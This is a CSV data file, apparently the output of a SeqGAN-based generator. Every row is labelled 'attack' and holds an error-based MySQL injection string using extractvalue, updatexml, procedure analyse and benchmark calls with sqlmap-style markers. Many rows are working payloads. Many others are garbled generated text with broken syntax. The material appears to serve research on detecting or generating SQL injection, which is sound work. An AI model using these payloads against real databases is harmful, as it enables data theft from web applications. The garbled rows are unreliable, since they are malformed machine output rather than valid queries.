attack,"1%""   )    )    usq$_nh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,78
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%o""  =  ""'  =  'kpk'  =  'kduganalysen  (  0x5c,0x7171706a71,  (  1808,concat  (  7982  =  7050  (  3393,1   )    (  extractvalue  (  5000000,md5  (  (  0x2e,1   )    )    (  extractvalue  (  9627(  (  0x2e,0x7171706a71,  (  (  5000000(  (  1808,1   )    (  extractvalue  (  5000000(  (  (  0x2e,  (  (  9788(  (  select   (  elt  (  elt  (  7982  (  (  (  benchmark  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,79
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,80
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,81
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,82
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,83
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,84
attack,"1%""   and extractvalue  (  9836  9836  )   (  0 0 4415s a  )  extractvalue  (  (  5000000,md5  (  =  (  )  (  0x5c,0x7171706a71,  (  select   (  case when   (  5603  (  0x52515a50   (  1724  (  elt  (  3393  =  (  (  (  0x5c,0x7171706a71,  (  (  5000000(  (  0x52515a50  =  6212,1   from d5  (  elt  (  1297  =  (  1808,concat  (  (  (  3393,m,  (  5000000(  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,85
attack,1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,86
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  "" ph' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,87
attack,"1%""   )    procede   (  (   (  2501  )   (  (  elt  (  6560  =  =  1535  =  (  9627,concat  (  3393,mdut  (  5322  =  (  3393,  (  (  select   (  elt    (  (  benchmark  (  (  3393,1   # l  (  4102  =  1  )  =  (  4968 and extractvalue  (  (  (  1297  =  3393,1   (  case 0 0x7171706a71 extractvalue  (  (  (  1808  =  (  8862,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,88
attack,"1%""   )    )     (  select   (  )   or extractvalue  (  (  =  (  2917,m(  (  (  (  (  9627,concat  (  (  (  0x2e,md5  (  3393,1   (  extractvalue  (  3393,concat  (  (  (  select   (  2501  =  (  9627,md5  (  0x2e,0x7171706a71,  (  (  select   (  el  (  e  (  0x5c,0x7171706a71,  (  select   (  elt  (  0x2e,md5  (  (  0x5c,0x7171706a71,0x7171706a71,  (  benchmark  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,89
attack,"17151p"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""s bnn_namodeal  )  )  1297=  (  (  (  extractvalue  (  (  (  benchmark  (  benchmark  (  5000000(  (  2917  =  (  (  7982,1   )    g 8083  0x7171706a71,USextractvalue  (  (  (  3393,1   )    (A    (  select 0 from dua  )  elt9667  =  1808,1   )    u 'i'    (  select   )    (  extractvalue  (  1535  (  7982,1   or updatexml  (  (  (  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,90
attack," AND procee    (  extractvalue  (  3393,  (  6528  (  5000000(  (  7982,1   )    (  extractvalue  (  9627,concat  (  (  0x2e,0x7171706a71,  (  4688  (  5000000,md5  (  (  1297,mO,0x7171706a71,  (  5000000(  0x2e,md5  (  (  0x5c,0x7171706a71,  (  t  (  (  (  5000000,md5  (  3393,  (  =  (  (  9627,concat  (  3393,1   (  8868  (  1297,1   )    (  9338  select   (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,91
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,92
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,93
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  'kbmnbl   (na  (  0x5c,  (  benchmark  (  (  (  9788  =  (  7982,1   (  extractvalue  (  benchmark  (  (  (  1808  =  (  (  1808  =  (  0x2e,0x7171706a71,  (  select   (  el  (  select   (  l  =  (  1808,1   and updatexml  (  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x2e,md5  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,94
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,95
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,96
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,97
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,98
attack,"1%""   )    )O5406WNTIR",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,99
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,100
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,101
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,102
attack," bt  (  e  (  1808  =  (  (  (  3393  =  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  9627,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  (  elt  e  (  1808  =  2917,  (  select   (   (  9836  (  (  1297,1   from d 0 or 0 from dual  )  e  )   (  3217  (  elt  (  elt  1297  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,103
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,104
attack,"1%""   (  case and extractvalue  (  (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  (  (  benchmark  (  (  (  (  5000000(  (  (  (  0x5c,0x7171706a71,mdualt  )  2826  e  =  3221   (  1724  (  5000000,md5  (  0x2e,  (  =  (  (  9627,concat  (  (  0x5c,  (  (  benchmark  (  (  benchmark  (   (  6461  (  (  (  7982  =  (  (  0x2e,0x7171706a71,  (  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,105
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,106
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,107
attack,"1"" and extractvalue  (  (  (  (  (  (  1808  =  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  0 0x7171706a71(  (  (  select   (  eltl  (  0x5c,  (  select   (  case   (  e  (  elta  el  (  1808  =  (  3393,md5  =  (  (  3393  =  (  3393,  (  (  benchmark  (  (  5000000,md5  (  0x2e,md5  (  (  select   (0 0 from du",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,108
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'knnUIgk'  =  'vk""  =  ""rf'  =  'jf",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,109
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,110
attack,"select   (  5847  (  (  7982,1   )    (  extractvalue  (  (  9788,1   (  case else extractvalue  (  (  (  (  (  (  7982  =  (  ' like '  (  0x5c,0x7171706a71,  (  extractvalue  (  (  (  (  (  3393,concat  (  (  (  (  (  0x2e,  (  select   (  elt  (  elt  (  3393  =  (  7982(  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  (  1808(  0x2e,  (  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,111
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""zx",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,112
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ikkNhfoc8768""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""eUannI1b1%'  =  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,113
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,114
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,115
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '(phkh5we",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,116
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,117
attack,1%   v,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,118
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,119
attack,"1"" and extractvalue  (  (  (  (  =  (  (  3393,concat  (  (  (  0x2e,0x7171706a71,1   (  )  )  select 0 from   (  (   (  4660  (  case 0 0 from d  (  5433  )   (  5777  (  (  elt  (  (  0x52515a50   end  (  elt  (  0x5c,mdual  )  7982,1   )    (  extractvalue  (  9627,md5  (  (  1049  =  (  3393,md5  (  0x2e,0x7171706a71,  (  benchmark  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,120
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%"" like ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,121
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,122
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,123
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,124
attack,"1354,concat  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  (  3393,concat  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  3393,concat  (  (  (  3393,m,  (  (  select   (  elt  case  =  8375  (  5000000,md5  (  7982  (  (  =  (  0x5c,md5  (  1297,1   )    )     )  extractvalue  (  (  (  3393,concat  (  (  (  (  0x5c,  (  (  5000000",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,125
attack,"1%""   )    (  extractvalue  (  (  (  (  (   (    5847(  (  2917,concat  (  (  (  (  (  (  (  (  3393  (  (  0x2e,(  (  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  5000000,md5  (  =  (  3393,1   )    ualys inal  extractvalue  (  2917  =  (  (  1049  =  (  (  3393,concat  (  (  (  0x5c,  (  (  5000000(  0x2e,md5  (  0x5c0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,126
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,127
attack,"1"" and updatexml  (  (  (  (  (  (  (  3393,concat  (  (  (  =  (  6528  (  7982,1   )    (  extractvalue  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1759  =  (  1808,  (  (  0x5c,0x7171706a71,  (  (    (  (  select   (  elt  (  e  (  1297  =  (  (  benchmark  (  5000000(  (  0x5c,0x7171706a71,  (  5000000(  (  (  case  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,128
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,129
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,130
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,131
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,132
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and """"  =  ""%""  =  ""      )    AND proce anal  )    SELECT 'i'  (  1 and extractvalue  (  (  (  (  3393,m,  (  benchmark  (  5000000(  (  0x5c,  (  (  select   (  elt  l  (  (  7982  =  (  (  1049  =  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  0x5c,  (  select   (  elt  (  e  (  50000003393,1   )    AND 3221  =  1 extractvalue  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,133
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and """" like ""k)dnnt  e    (  (  (  (  0x5c,md5  (  (  0x2e,md5  (  select   (  (  elt  (  1808  =  (  (  1808  =  (  7982,  (  (  (  0x52515a50   (  ut  (  elt  (  elt  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  elt  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  0x5c,  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,134
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nch' like 'kunni",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,135
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,136
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,137
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,138
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,139
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,140
attack,"1%""   )    )     (  extractvalue  (  (  9836  )   (    (  (  (  (  elt  (  0x5c,  (  benchmark  (  (  benchmark  (  (  8862,1   (  extractvalue  (  2917,concat  (  (  (  0x2e,  (  =  (  9627,md5  (  (  select   (  elt  (  elt  (  1808  =  (  2917,md5  (  (  0x2e,  (  benchmark  (  (  (  9627,concat  (  (    (  (  select   (  (  e  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,141
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  "")      )    AND du ineanalyse  (  (  elt  (  1808  =  (  =  (  7982,1   )    (  extractvalue  (  (  benchmark  (  (  9627,1   )    Y  select   (  9103  (  0x5c,  (  =  (  1049  (  =  (  2917,md5  (  79820x7171706a71,  (  (  select   (  1724  (  3393,1   )    )     )  extractvalue  (  9627,md5  (  0x2e,0x7171706a71,  (  (  select   (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,142
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,143
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,144
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,145
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,146
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,147
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '""   )    usvDr T  (  x  (  8862_  (  select   (  e  (  elt  (  1808  =  (  3393,1 0 from dua  el  (  elt  (  elt  (  (  8862  =  1 or else cast  (  (  1 from an  (  4774   l  =  (  7982,md5  ,md5  (  0x5c,0x7171706a71,  (  (  9627,concat=  9338 0 0 from du 0 0 from   (  (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,148
attack,"1%""   )    )    AND 3221  =  8083  )  select   (  1535  )   from dual  )  5433  )  (  (  elt  (  3393  =  (  (  1 as d AND   (  3393,1   )    (  extractvalue  (  3393,m,0x717a767a71   (  (  (  elt  (  1808  =  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  elt  (  eys(  (  benchmark  (  1049  =  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,149
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,150
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,151
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,152
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,153
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,154
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""knn3217mmb'  =  'z' like 'nh' like 'q"" like ""ege' like 'nn"" like ""zq",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,155
attack,"1%""   )    proce duanalyse  (   (  (  elt  elt  (  7982  =  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  4241  2446  =  concat  (  (  0x2e,0x7171706a71,  (  5000000,m5  (  (  (  benchmark  (  (  5000000(  benchmark  (  (  select   (  elt  (  0x4b774c75   end  (  (  case when   (  case 0 from d5  (  elt  e  (  9490  1297=  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,156
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,157
attack,"1%"" and extractvalue  (  (  (  (  (  0x5c,md5  (  (  0x2e,concat  (  1724  (  =  (  (   (  (  case 0 0 from duanal  )  el  )   end  (  (  elt  elt  (  elt  (  1808  =  (  3393,  (  (  (  select   (  e  (  elt  (  3393,concat  (  0x5c,  (  9627,md5  (  (  0x2e,  (  (  (  5000000  (  (  5000000,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,158
